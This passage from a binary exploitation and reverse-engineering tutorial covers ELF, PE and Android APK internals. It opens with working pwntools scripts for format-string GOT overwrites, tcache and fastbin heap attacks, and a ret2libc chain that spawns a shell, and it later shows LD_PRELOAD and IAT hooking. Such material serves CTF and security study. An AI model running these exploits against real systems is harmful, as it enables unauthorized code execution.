        p.sendline(payload)
        
        output = p.recvline()
        
        # Parse leaked address
        if b'0x' in output:
            addr = int(output.split(b'0x')[1][:12], 16)
            p.close()
            return addr
        
        p.close()
        return None
    
    def arbitrary_write(self, target_addr, value):
        """Write arbitrary value to address"""
        if not self.offset:
            self.find_offset()
        
        log.info(f"Writing {hex(value)} to {hex(target_addr)}")
        
        payload = fmtstr_payload(self.offset, {target_addr: value})
        
        p = self.start()
        p.sendline(payload)
        p.recvall(timeout=1)
        p.close()
    
    def exploit_got_overwrite(self):
        """Overwrite GOT entry to redirect execution"""
        if not self.offset:
            self.find_offset()
        
        # Overwrite exit@GOT with main address
        target = self.elf.got['exit']
        value = self.elf.symbols['main']
        
        log.info(f"Overwriting exit@GOT ({hex(target)}) with main ({hex(value)})")
        
        payload = fmtstr_payload(self.offset, {target: value})
        
        p = self.start()
        p.sendline(payload)
        p.interactive()

# Usage
if __name__ == '__main__':
    fse = FormatStringExploit('./format_vuln')
    fse.exploit_got_overwrite()
```

### Heap Exploitation Automation

```python
#!/usr/bin/env python3
from pwn import *

class HeapExploit:
    def __init__(self, binary_path):
        self.elf = ELF(binary_path)
        self.libc = ELF('./libc.so.6')
        self.p = None
        
        context.arch = self.elf.arch
        context.log_level = 'info'
    
    def start(self):
        self.p = process(self.elf.path)
    
    def malloc(self, size, data=b''):
        """Allocate chunk"""
        self.p.sendlineafter(b'Choice: ', b'1')
        self.p.sendlineafter(b'Size: ', str(size).encode())
        if data:
            self.p.sendafter(b'Data: ', data)
    
    def free(self, index):
        """Free chunk"""
        self.p.sendlineafter(b'Choice: ', b'2')
        self.p.sendlineafter(b'Index: ', str(index).encode())
    
    def edit(self, index, data):
        """Edit chunk"""
        self.p.sendlineafter(b'Choice: ', b'3')
        self.p.sendlineafter(b'Index: ', str(index).encode())
        self.p.sendafter(b'Data: ', data)
    
    def view(self, index):
        """View chunk content"""
        self.p.sendlineafter(b'Choice: ', b'4')
        self.p.sendlineafter(b'Index: ', str(index).encode())
        self.p.recvuntil(b'Content: ')
        return self.p.recvline()
    
    def tcache_poisoning(self):
        """[Inference] Exploit using tcache poisoning"""
        log.info("Performing tcache poisoning attack...")
        
        # Allocate chunks
        self.malloc(0x80)  # chunk 0
        self.malloc(0x80)  # chunk 1
        self.malloc(0x80)  # chunk 2 - prevent consolidation
        
        # Free to populate tcache
        self.free(0)
        self.free(1)
        
        # Overflow chunk 1 to overwrite fd pointer
        target_addr = self.elf.got['free']
        
        payload = flat([
            b'A' * 0x80,
            0x91,  # size field
            target_addr
        ])
        
        # [Unverified] This assumes a use-after-free or overflow exists
        self.edit(1, payload)
        
        # Allocate to get target address
        self.malloc(0x80)
        self.malloc(0x80)  # This will return target_addr
        
        # Write one_gadget to free@GOT
        one_gadget = self.libc.address + 0x4f3d5  # [Unverified] offset may vary
        self.edit(2, p64(one_gadget))
        
        # Trigger free to execute one_gadget
        self.free(0)
        
        self.p.interactive()
    
    def fastbin_dup(self):
        """[Inference] Exploit using fastbin duplication"""
        log.info("Performing fastbin dup attack...")
        
        # Allocate chunks in fastbin size range
        self.malloc(0x60)  # chunk 0
        self.malloc(0x60)  # chunk 1
        self.malloc(0x60)  # chunk 2
        
        # Create double-free scenario
        self.free(0)
        self.free(1)
        # [Unverified] Assumes double-free protection can be bypassed
        self.free(0)  # fastbin: 0 -> 1 -> 0
        
        # Allocate and overwrite fd
        target = self.elf.symbols['target_variable']
        self.malloc(0x60, p64(target))
        
        # Drain fastbin
        self.malloc(0x60)
        self.malloc(0x60)
        
        # Next allocation returns target address
        self.malloc(0x60)
        
        self.p.interactive()

# Usage
if __name__ == '__main__':
    he = HeapExploit('./heap_vuln')
    he.start()
    he.tcache_poisoning()
```

### Multi-Stage Exploitation Framework

```python
#!/usr/bin/env python3
from pwn import *
import sys

class MultiStageExploit:
    def __init__(self, config):
        self.config = config
        self.elf = ELF(config['binary'])
        self.libc = None
        self.p = None
        self.leaks = {}
        
        context.update(arch=self.elf.arch, os='linux')
    
    def stage1_information_leak(self):
        """Stage 1: Leak addresses"""
        log.info("Stage 1: Information leak")
        
        self.p = process(self.elf.path) if not self.config.get('remote') else \
                 remote(self.config['host'], self.config['port'])
        
        # Custom leak method based on config
        leak_method = self.config.get('leak_method', 'puts')
        
        if leak_method == 'puts':
            leak = self._leak_via_puts()
        elif leak_method == 'format_string':
            leak = self._leak_via_format_string()
        else:
            log.error("Unknown leak method")
            sys.exit(1)
        
        self.leaks['libc_leak'] = leak
        
        # Load libc
        self.libc = ELF(self.config.get('libc', './libc.so.6'))
        self.libc.address = leak - self.libc.symbols[self.config.get('leak_symbol', 'puts')]
        
        log.success(f"Libc base: {hex(self.libc.address)}")
        
        return leak
    
    def _leak_via_puts(self):
        """Leak using puts"""
        offset = self.config['offset']
        
        rop = ROP(self.elf)
        
        payload = flat([
            b'A' * offset,
            rop.find_gadget(['pop rdi', 'ret'])[0],
            self.elf.got['puts'],
            self.elf.plt['puts'],
            self.elf.symbols['main']
        ])
        
        self.p.sendline(payload)
        self.p.recvuntil(self.config.get('leak_marker', b'\n'))
        
        leak = u64(self.p.recv(6).ljust(8, b'\x00'))
        return leak
    
    def _leak_via_format_string(self):
        """Leak using format string"""
        position = self.config['format_position']
        
        self.p.sendline(f"%{position}$p".encode())
        output = self.p.recvline()
        
        leak = int(output.split(b'0x')[1][:12], 16)
        return leak
    
    def stage2_exploit(self):
        """Stage 2: Final exploitation"""
        log.info("Stage 2: Exploitation")
        
        exploit_type = self.config.get('exploit_type', 'ret2libc')
        
        if exploit_type == 'ret2libc':
            payload = self._build_ret2libc()
        elif exploit_type == 'rop_chain':
            payload = self._build_custom_rop()
        else:
            log.error("Unknown exploit type")
            sys.exit(1)
        
        self.p.sendline(payload)
        
        log.success("Exploit delivered!")
        self.p.interactive()
    
    def _build_ret2libc(self):
        """Build ret2libc payload"""
        offset = self.config['offset']
        
        rop = ROP(self.libc)
        binsh = next(self.libc.search(b'/bin/sh\x00'))
        
        payload = flat([
            b'A' * offset,
            rop.find_gadget(['ret'])[0],
            rop.find_gadget(['pop rdi', 'ret'])[0],
            binsh,
            self.libc.symbols['system']
        ])
        
        return payload
    
    def _build_custom_rop(self):
        """Build custom ROP chain from config"""
        offset = self.config['offset']
        rop = ROP(self.libc)
        
        chain = []
        for gadget_spec in self.config['rop_chain']:
            if gadget_spec['type'] == 'gadget':
                chain.append(rop.find_gadget(gadget_spec['pattern'])[0])
            elif gadget_spec['type'] == 'value':
                chain.append(gadget_spec['value'])
            elif gadget_spec['type'] == 'symbol':
                chain.append(self.libc.symbols[gadget_spec['name']])
        
        payload = flat([b'A' * offset] + chain)
        return payload
    
    def run(self):
        """Execute full exploitation chain"""
        try:
            self.stage1_information_leak()
            self.stage2_exploit()
        except Exception as e:
            log.error(f"Exploitation failed: {e}")
            if self.p:
                self.p.close()

# Usage with configuration
if __name__ == '__main__':
    config = {
        'binary': './challenge',
        'libc': './libc.so.6',
        'offset': 72,
        'leak_method': 'puts',
        'leak_symbol': 'puts',
        'leak_marker': b'Enter input: ',
        'exploit_type': 'ret2libc',
        # Optional remote config
        # 'remote': True,
        # 'host': 'challenge.server.com',
        # 'port': 1337,
    }
    
    exploit = MultiStageExploit(config)
    exploit.run()
```

**Important Subtopics:**

- **One-gadget finder** - Tools like one_gadget for finding single-instruction shell spawns
- **ROPgadget integration** - Combining ropper/ROPgadget with automation scripts
- **Angr framework** - Symbolic execution for automatic exploit path discovery
- **AFL/fuzzing integration** - Automating vulnerability discovery before exploitation
- **Remote exploit adaptations** - Handling timing, network conditions, and remote-specific constraints

---

# Platform-Specific Analysis

## Linux ELF Binaries

### ELF Structure Overview

**ELF Header Format:**

```c
typedef struct {
    unsigned char e_ident[16];    // Magic: 0x7f 'E' 'L' 'F'
    uint16_t e_type;               // ET_EXEC (2), ET_DYN (3), ET_REL (1)
    uint16_t e_machine;            // EM_X86_64 (62), EM_386 (3), EM_ARM (40)
    uint32_t e_version;
    uint64_t e_entry;              // Entry point address
    uint64_t e_phoff;              // Program header offset
    uint64_t e_shoff;              // Section header offset
    uint32_t e_flags;
    uint16_t e_ehsize;             // ELF header size
    uint16_t e_phentsize;          // Program header entry size
    uint16_t e_phnum;              // Number of program headers
    uint16_t e_shentsize;          // Section header entry size
    uint16_t e_shnum;              // Number of section headers
    uint16_t e_shstrndx;           // Section header string table index
} Elf64_Ehdr;
```

**Examining ELF Headers:**

```bash
# Basic file info
file binary
# Output: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

# Detailed header
readelf -h binary

# Alternative with hexdump
hexdump -C binary | head -n 5
# Look for: 7f 45 4c 46 (0x7f 'ELF')
```

### Program Headers vs Section Headers

**Program Headers (runtime view):**

```bash
readelf -l binary

# Key segments:
# LOAD    - Loadable segment (text/data)
# DYNAMIC - Dynamic linking information
# INTERP  - Path to dynamic linker (/lib64/ld-linux-x86-64.so.2)
# GNU_STACK - Stack permissions
# GNU_RELRO - Relocation read-only segment
```

**Section Headers (linking view):**

```bash
readelf -S binary

# Critical sections:
# .text     - Executable code
# .rodata   - Read-only data (strings, constants)
# .data     - Initialized writable data
# .bss      - Uninitialized data (zero-filled at runtime)
# .plt      - Procedure Linkage Table
# .got      - Global Offset Table
# .got.plt  - GOT for PLT (lazy binding)
# .dynamic  - Dynamic linking info
# .dynsym   - Dynamic symbol table
# .symtab   - Complete symbol table
# .rel.dyn  - Relocations for data
# .rel.plt  - Relocations for functions
```

**Extracting Section Content:**

```bash
# Dump specific section
readelf -x .rodata binary    # Hex dump
readelf -p .rodata binary    # String dump

# Extract section to file
objcopy --dump-section .text=text.bin binary

# View all strings in section
strings -t x binary | grep "offset"
```

### Global Offset Table (GOT)

**GOT Structure and Purpose:**

The GOT contains absolute addresses for:

- Global variables from shared libraries
- Function pointers (in .got.plt for lazy binding)

**GOT Entry States:**

1. **Before First Call (Lazy Binding):**

```
.got.plt[n] → PLT stub (push index; jmp resolver)
```

2. **After Resolution:**

```
.got.plt[n] → Actual function address in libc
```

**Examining GOT:**

```bash
# View GOT entries
readelf -r binary

# Example output:
# Offset          Info           Type           Sym. Value    Sym. Name
# 000000404018  000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5
# 000000404020  000400000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5

# In GDB, examine GOT after execution
gdb binary
break main
run
x/gx 0x404018    # Examine GOT entry for printf
```

**GOT in Memory (Runtime):**

```bash
# Using pwndbg/gef
got    # Show all GOT entries with resolved addresses

# Manual inspection
x/20gx &_GLOBAL_OFFSET_TABLE_

# Check if GOT is writable (RELRO check)
readelf -l binary | grep GNU_RELRO
# Full RELRO: GOT read-only after relocation
# Partial RELRO: .got read-only, .got.plt writable
```

**GOT Overwrite Attack Pattern:**

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Target: Overwrite puts@got with system
got_puts = elf.got['puts']

# Calculate offset to system in libc
libc_base = <leaked_address> - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']

# Exploit: Write system address to puts@got
# Next call to puts("/bin/sh") executes system("/bin/sh")
```

### Procedure Linkage Table (PLT)

**PLT Purpose:**

- Enables lazy binding (resolve functions on first call)
- Provides consistent call interface for external functions

**PLT Structure:**

```nasm
; PLT Entry for printf
.plt:
printf@plt:
    jmp [printf@got.plt]     ; Jump to GOT entry
    push 0                   ; Relocation index
    jmp .plt.resolve         ; Jump to resolver

.plt.resolve:
    push [got.plt+8]         ; Push link_map
    jmp [got.plt+16]         ; Jump to _dl_runtime_resolve
```

**First Call Flow:**

1. Call `printf@plt`
2. Jump to address in `printf@got.plt` (initially next instruction)
3. Push relocation index
4. Jump to `_dl_runtime_resolve`
5. Resolver finds real `printf` address in libc
6. Updates `printf@got.plt` with real address
7. Jumps to real `printf`

**Subsequent Calls:**

- `printf@plt` → `printf@got.plt` (now contains real address) → real `printf`

**Examining PLT:**

```bash
# Disassemble PLT section
objdump -d -j .plt binary

# In GDB
disassemble 'printf@plt'

# List all PLT entries
objdump -d binary | grep "@plt"

# With pwntools
from pwn import *
elf = ELF('./binary')
print(hex(elf.plt['printf']))    # PLT address
print(hex(elf.got['printf']))    # GOT address
```

**ret2plt Technique:**

```python
# Call PLT functions with controlled arguments
payload = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(bin_sh_addr),
    p64(elf.plt['system'])    # Call system@plt("/bin/sh")
)
```

### ELF Relocations

**Relocation Types:**

|Type|Value|Description|
|---|---|---|
|R_X86_64_NONE|0|No relocation|
|R_X86_64_64|1|Direct 64-bit address|
|R_X86_64_PC32|2|PC-relative 32-bit|
|R_X86_64_GOT32|3|32-bit GOT entry|
|R_X86_64_PLT32|4|32-bit PLT address|
|R_X86_64_COPY|5|Copy symbol at runtime|
|R_X86_64_GLOB_DAT|6|GOT entry for global data|
|R_X86_64_JUMP_SLOT|7|PLT entry|
|R_X86_64_RELATIVE|8|Relative to load address|

**Viewing Relocations:**

```bash
# All relocations
readelf -r binary

# Dynamic relocations only
readelf --relocs --use-dynamic binary

# Specific section
objdump -R binary    # Same as readelf -r
```

**Relocation Processing:**

```bash
# Relocation format in readelf output:
# Offset: Where to apply relocation (GOT address)
# Info: Relocation type + symbol index
# Sym. Value: Symbol's original value
# Sym. Name: Symbol being relocated

# Example:
# 0000000000404018  0000000300000007 R_X86_64_JUMP_SLOT     0 printf@GLIBC_2.2.5
# At runtime: Write address of printf to 0x404018
```

### RELRO (Relocation Read-Only)

**Protection Levels:**

**No RELRO:**

```bash
# GOT fully writable
gcc -no-pie -z norelro source.c -o binary
checksec binary
# RELRO: No RELRO
```

**Partial RELRO (default):**

```bash
# .got read-only, .got.plt writable
gcc -Wl,-z,relro source.c -o binary
# RELRO: Partial RELRO
# GOT overwrite still possible on function pointers
```

**Full RELRO:**

```bash
# Entire GOT read-only after all relocations
gcc -Wl,-z,relro,-z,now source.c -o binary
# RELRO: Full RELRO
# All functions resolved at load time (no lazy binding)
# GOT overwrite not possible
```

**Checking RELRO:**

```bash
# Method 1: checksec
checksec --file=binary

# Method 2: readelf
readelf -l binary | grep GNU_RELRO
readelf -d binary | grep BIND_NOW
# BIND_NOW present = Full RELRO

# Method 3: Examine sections
readelf -S binary | grep -E "(\.got|\.got\.plt)"
# Check if .got.plt exists (Partial) or merged into .got (Full)
```

### Dynamic Linking Analysis

**Viewing Dynamic Dependencies:**

```bash
# List shared library dependencies
ldd binary
# Output:
#   linux-vdso.so.1 => (0x00007fff...)
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
#   /lib64/ld-linux-x86-64.so.2 (0x00007f...)

# Security note: Never run ldd on untrusted binaries
# It executes the dynamic linker with the binary

# Safer alternatives:
objdump -p binary | grep NEEDED
readelf -d binary | grep NEEDED

# Example output:
# 0x0000000000000001 (NEEDED)    Shared library: [libc.so.6]
```

**Dynamic Symbol Table:**

```bash
# View dynamic symbols
readelf --dyn-syms binary
nm -D binary

# Example output:
#                  U printf@@GLIBC_2.2.5    # Undefined (external)
# 0000000000001169 T main                  # Defined text
# 0000000000004028 D global_var            # Defined data
```

**RPATH and RUNPATH:**

```bash
# Check library search paths
readelf -d binary | grep -E "(RPATH|RUNPATH)"

# RPATH: Searched before LD_LIBRARY_PATH (security risk)
# RUNPATH: Searched after LD_LIBRARY_PATH (safer)

# Library search order:
# 1. RPATH (unless RUNPATH present)
# 2. LD_LIBRARY_PATH
# 3. RUNPATH
# 4. /etc/ld.so.cache
# 5. /lib, /usr/lib
```

**LD_PRELOAD Hijacking:**

```bash
# Preload custom library to override functions
echo 'int puts(const char *s) { return 0; }' > hook.c
gcc -shared -fPIC hook.c -o hook.so

LD_PRELOAD=./hook.so ./binary    # puts() now hooked

# Defense: Set-UID binaries ignore LD_PRELOAD
```

### Symbol Tables

**Static Symbol Table (.symtab):**

```bash
# Contains all symbols (if not stripped)
readelf -s binary
nm binary

# Symbol binding:
# GLOBAL - Visible to all files
# LOCAL  - Visible only in this file
# WEAK   - Can be overridden

# Symbol types:
# FUNC   - Function
# OBJECT - Data object
# FILE   - Source filename
# NOTYPE - No type specified
```

**Stripped vs Non-Stripped:**

```bash
# Check if binary is stripped
file binary
# "not stripped" - Contains debug symbols
# "stripped" - Debug symbols removed

# Strip binary
strip binary          # Remove all symbols
strip -s binary       # Remove all symbols (same)
strip --strip-debug binary  # Remove debug only, keep dynamic

# Recover some info from stripped binary
# [Inference] - Limited recovery possible through:
# - Dynamic symbols (readelf --dyn-syms)
# - String references
# - Function signatures from calling conventions
```

## Windows PE Binaries

### PE File Structure

**PE Header Layout:**

```
+------------------------+
| DOS Header (64 bytes)  |  "MZ" signature (0x5A4D)
+------------------------+
| DOS Stub               |  Legacy DOS program
+------------------------+
| PE Signature           |  "PE\0\0" (0x50450000)
+------------------------+
| COFF File Header       |  Machine type, sections, timestamp
+------------------------+
| Optional Header        |  Entry point, image base, subsystem
+------------------------+
| Section Headers        |  .text, .data, .rdata, .rsrc, etc.
+------------------------+
| Section Data           |  Actual code and data
+------------------------+
```

**Examining PE Headers:**

```bash
# On Linux with pev tools
readpe binary.exe
pesec binary.exe

# With objdump (if installed with mingw support)
objdump -x binary.exe

# On Windows
dumpbin /headers binary.exe    # Visual Studio tool
```

**Python PE Analysis:**

```python
import pefile

pe = pefile.PE('binary.exe')

# Basic info
print(f"Entry Point: {hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}")
print(f"Image Base: {hex(pe.OPTIONAL_HEADER.ImageBase)}")
print(f"Subsystem: {pe.OPTIONAL_HEADER.Subsystem}")  # 2=GUI, 3=Console

# Machine type
print(f"Machine: {hex(pe.FILE_HEADER.Machine)}")
# 0x14c = x86, 0x8664 = x64, 0x1c0 = ARM
```

**DOS Header Recognition:**

```bash
# First two bytes: "MZ" (Mark Zbikowski)
hexdump -C binary.exe | head -n 1
# 00000000  4d 5a 90 00 03 00 00 00  ...

# PE signature offset at 0x3C
hexdump -C binary.exe | grep "50 45 00 00"
```

### PE Sections

**Common Section Names:**

|Section|Purpose|Characteristics|
|---|---|---|
|.text|Executable code|Read, Execute|
|.data|Initialized writable data|Read, Write|
|.rdata|Read-only data (constants, imports)|Read|
|.bss|Uninitialized data|Read, Write|
|.rsrc|Resources (icons, dialogs, strings)|Read|
|.idata|Import Address Table|Read, Write|
|.edata|Export table|Read|
|.reloc|Base relocations|Read|
|.tls|Thread-Local Storage|Read, Write|

**Analyzing Sections:**

```bash
# List sections with pev
pesec -s binary.exe

# With Python
python3 << EOF
import pefile
pe = pefile.PE('binary.exe')
for section in pe.sections:
    print(f"{section.Name.decode().rstrip('\x00'):10} "
          f"VirtAddr: {hex(section.VirtualAddress):10} "
          f"VirtSize: {hex(section.Misc_VirtualSize):10} "
          f"RawSize: {hex(section.SizeOfRawData):10}")
EOF
```

**Section Characteristics:**

```python
# Check section permissions
import pefile

pe = pefile.PE('binary.exe')
for section in pe.sections:
    name = section.Name.decode().rstrip('\x00')
    char = section.Characteristics
    
    perms = []
    if char & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
        perms.append('X')
    if char & 0x40000000:  # IMAGE_SCN_MEM_READ
        perms.append('R')
    if char & 0x80000000:  # IMAGE_SCN_MEM_WRITE
        perms.append('W')
    
    print(f"{name:10} {''.join(perms)}")
```

**Extracting Section Data:**

```python
# Extract .text section
import pefile

pe = pefile.PE('binary.exe')
for section in pe.sections:
    if section.Name.startswith(b'.text'):
        data = section.get_data()
        with open('text_section.bin', 'wb') as f:
            f.write(data)
```

### Import Address Table (IAT)

**IAT Structure:**

The IAT contains addresses of imported functions from DLLs. At load time, the Windows loader fills the IAT with actual function addresses.

**Before Loading:**

```
IAT Entry → Import Name Table → Function Name String
```

**After Loading:**

```
IAT Entry → Actual Function Address in DLL
```

**Viewing Imports:**

```bash
# List all imports
pestr -i binary.exe

# Detailed import info
python3 << EOF
import pefile

pe = pefile.PE('binary.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"\n{entry.dll.decode()}:")
    for imp in entry.imports:
        if imp.name:
            print(f"  {hex(imp.address):10} {imp.name.decode()}")
        else:
            print(f"  {hex(imp.address):10} Ordinal: {imp.ordinal}")
EOF
```

**IAT in IDA/Ghidra:**

- IDA: View → Open subviews → Imports
- Ghidra: Window → Symbol Table → Filter "imports"

**IAT Hooking:**

```python
# Common technique: Overwrite IAT entry to redirect function calls
# Example: Hook MessageBoxA

import pefile
import struct

pe = pefile.PE('target.exe')

# Find MessageBoxA in IAT
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    if b'USER32.dll' in entry.dll.upper():
        for imp in entry.imports:
            if imp.name == b'MessageBoxA':
                iat_offset = pe.get_offset_from_rva(imp.address)
                # Write hook address at iat_offset
                # [Unverified] - Actual hooking requires runtime patching
```

### Import by Ordinal

**Ordinal-based Imports:**

```python
# Some functions imported by number instead of name
import pefile

pe = pefile.PE('binary.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    for imp in entry.imports:
        if not imp.name and imp.ordinal:
            print(f"DLL: {entry.dll.decode()}, Ordinal: {imp.ordinal}")

# Resolve ordinals: Check DLL export table or online databases
# Example: kernel32.dll ordinal 123 = LoadLibraryA [Inference based on common knowledge]
```

### Export Address Table (EAT)

**Viewing Exports:**

```bash
# List exports
python3 << EOF
import pefile

pe = pefile.PE('library.dll')
if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        print(f"{exp.ordinal:5} {hex(exp.address):10} {exp.name.decode() if exp.name else 'N/A'}")
EOF
```

**Export Forwarding:**

```python
# Some exports forward to other DLLs
# Example: ntdll.RtlInitializeCriticalSection → kernel32.InitializeCriticalSection

for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    if exp.forwarder:
        print(f"{exp.name.decode()} → {exp.forwarder.decode()}")
```

### Resource Section Analysis

**Resource Types:**

- RT_ICON (3) - Icons
- RT_DIALOG (5) - Dialog boxes
- RT_STRING (6) - String tables
- RT_RCDATA (10) - Raw data
- RT_VERSION (16) - Version information

**Extracting Resources:**

```bash
# With ResourceHacker (Windows)
ResourceHacker.exe -open binary.exe -save resources.txt -action extract -mask ,,

# With Python
python3 << EOF
import pefile

pe = pefile.PE('binary.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        print(f"Type: {entry.id}, Name: {entry.name}")
        # Recursively explore resource tree
EOF
```

**Extracting Embedded Files:**

```python
# Common in malware: Extract embedded PE from resources
import pefile

pe = pefile.PE('dropper.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        for sub_entry in entry.directory.entries:
            data = pe.get_data(sub_entry.data.struct.OffsetToData, 
                              sub_entry.data.struct.Size)
            if data.startswith(b'MZ'):  # Potential embedded PE
                with open(f'extracted_{entry.id}.exe', 'wb') as f:
                    f.write(data)
```

### PE Security Features

**ASLR (Address Space Layout Randomization):**

```python
# Check DLL characteristics
import pefile

pe = pefile.PE('binary.exe')
dll_char = pe.OPTIONAL_HEADER.DllCharacteristics

IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040
if dll_char & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE:
    print("ASLR: Enabled")
else:
    print("ASLR: Disabled")
```

**DEP (Data Execution Prevention):**

```python
IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x0100
if dll_char & IMAGE_DLLCHARACTERISTICS_NX_COMPAT:
    print("DEP: Enabled")
else:
    print("DEP: Disabled")
```

**SafeSEH:**

```python
IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400
if dll_char & IMAGE_DLLCHARACTERISTICS_NO_SEH:
    print("SEH: Disabled (SafeSEH)")
```

**Control Flow Guard (CFG):**

```python
IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000
if dll_char & IMAGE_DLLCHARACTERISTICS_GUARD_CF:
    print("CFG: Enabled")
```

**Comprehensive Security Check:**

```bash
# Using winchecksec (Windows)
winchecksec.exe binary.exe

# Using checksec.py (Linux)
python3 checksec.py --file binary.exe
```

### PE Packing and Obfuscation Detection

**Entropy Analysis:**

```python
import pefile
import math
from collections import Counter

def section_entropy(data):
    if not data:
        return 0
    counts = Counter(data)
    length = len(data)
    probs = [count / length for count in counts.values()]
    return -sum(p * math.log2(p) for p in probs)

pe = pefile.PE('binary.exe')
for section in pe.sections:
    name = section.Name.decode().rstrip('\x00')
    data = section.get_data()
    ent = section_entropy(data)
    print(f"{name:10} Entropy: {ent:.2f}")
    if ent > 7.2:
        print("  ⚠ Possibly packed/encrypted")
```

**Packer Signatures:**

```bash
# Detect common packers
# UPX: "UPX0", "UPX1" section names
# ASPack: ".aspack", ".adata" sections
# PECompact: ".pec1", ".pec2" sections

strings binary.exe | grep -i -E "(upx|aspack|pecompact|themida)"
```

**Import Anomalies:**

```python
# Packed executables often have minimal imports
import pefile

pe = pefile.PE('binary.exe')
import_count = sum(len(entry.imports) 
                  for entry in pe.DIRECTORY_ENTRY_IMPORT)

print(f"Total imports: {import_count}")
if import_count < 10:
    print("⚠ Suspiciously few imports - possible packing")
```

**Unpacking with UPX:**

```bash
# Detect UPX
upx -t binary.exe

# Unpack
upx -d binary.exe -o unpacked.exe
```

## Android APK Analysis

### APK Structure

**APK File Layout:**

```
AndroidManifest.xml    - App metadata (permissions, components)
classes.dex            - Compiled Dalvik bytecode
resources.arsc         - Compiled resources
res/                   - Resources (layouts, images)
lib/                   - Native libraries (armeabi-v7a, arm64-v8a, x86)
assets/                - Raw asset files
META-INF/              - Signing certificates
    MANIFEST.MF
    CERT.SF
    CERT.RSA
```

**Extracting APK:**

```bash
# APK is a ZIP archive
unzip app.apk -d app_extracted/

# Or use apktool for proper decoding
apktool d app.apk -o app_decoded/
```

### Dalvik Bytecode Analysis

**DEX File Format:**

DEX (Dalvik Executable) contains:

- String table
- Type table
- Method prototypes
- Class definitions
- Method bytecode

**Examining DEX:**

```bash
# List classes
dexdump -f classes.dex | grep "Class descriptor"

# Disassemble specific class
dexdump -d classes.dex | grep -A 50 "Lcom/example/MainActivity"

# Better: Convert to smali (Dalvik assembly)
baksmali d classes.dex -o smali_output/
```

### Smali Assembly Language

**Smali Syntax Basics:**

```smali
.class public Lcom/example/MainActivity;
.super Landroid/app/Activity;

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2                    # Number of local registers
    .parameter "savedInstanceState"
    
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    
    const-string v0, "Hello"     # v0 = "Hello"
    const-string v1, "World"     # v1 = "World"
    
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    
    return-void
.end method
```

**Register Types:**

- **v0-v15** - Local registers
- **p0-pN** - Parameter registers
- **p0** in instance methods = `this`

**Common Instructions:**

|Instruction|Description|Example|
|---|---|---|
|const|Load constant|`const v0, 0x10`|
|const-string|Load string|`const-string v0, "text"`|
|move|Copy register|`move v1, v0`|
|invoke-virtual|Call instance method|`invoke-virtual {v0}, Lclass;->method()V`|
|invoke-static|Call static method|`invoke-static {}, Lclass;->method()V`|
|invoke-direct|Call constructor/private|`invoke-direct {v0}, Lclass;-><init>()V`|
|iget|Get instance field|`iget v0, p0, Lclass;->field:I`|
|iput|Set instance field|`iput v0, p0, Lclass;->field:I`|
|sget|Get static field|`sget-object v0, Lclass;->field:Ljava/lang/String;`|
|if-eq|Branch if equal|`if-eq v0, v1, :label`|
|goto|Unconditional jump|`goto :label`|
|return|Return value|`return v0`|

**Method Signatures:**

- **V** - void
- **Z** - boolean
- **B** - byte
- **S** - short
- **C** - char
- **I** - int
- **J** - long (64-bit)
- **F** - float
- **D** - double (64-bit)
- **Lpackage/Class;** - Object type
- **[** - Array prefix

**Example Method Signature:**

```smali
.method public checkPassword(Ljava/lang/String;)Z
# Parameters: String
# Returns: boolean
```

### Decompiling to Java

**Using jadx:**

```bash
# GUI mode
jadx-gui app.apk

# Command-line
jadx -d output_dir app.apk

# Decompile specific class
jadx --show-bad-code -d output app.apk

# Export as Gradle project
jadx --export-gradle -d project_dir app.apk
```

**Using dex2jar + JD-GUI:**

```bash
# Convert DEX to JAR
d2j-dex2jar classes.dex -o output.jar

# Open output.jar in JD-GUI for Java decompilation
jd-gui output.jar
```

**Decompilation Quality:**

- jadx generally produces better results [Inference based on common usage]
- Some obfuscated code may not decompile correctly
- Compare smali and Java output for accuracy

### AndroidManifest.xml Analysis

**Decoding Manifest:**

```bash
# Binary XML format - decode with apktool
apktool d app.apk

# View decoded manifest
cat app_decoded/AndroidManifest.xml
```

**Critical Manifest Elements:**

```xml
<manifest package="com.example.app">
    <!-- Permissions requested -->
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    
    <application android:debuggable="true">
        <!-- Exported activities (can be called externally) -->
        <activity android:name=".MainActivity"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
            </intent-filter>
        </activity>
        
        <!-- Broadcast receivers -->
        <receiver android:name=".BootReceiver"
                  android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        
        <!-- Services -->
<service android:name=".BackgroundService" android:exported="false"/>

    <!-- Content providers -->
    <provider android:name=".DataProvider"
              android:authorities="com.example.provider"
              android:exported="true"/>
</application>

</manifest>
```

**Security Analysis:**

```bash
# Check for dangerous permissions
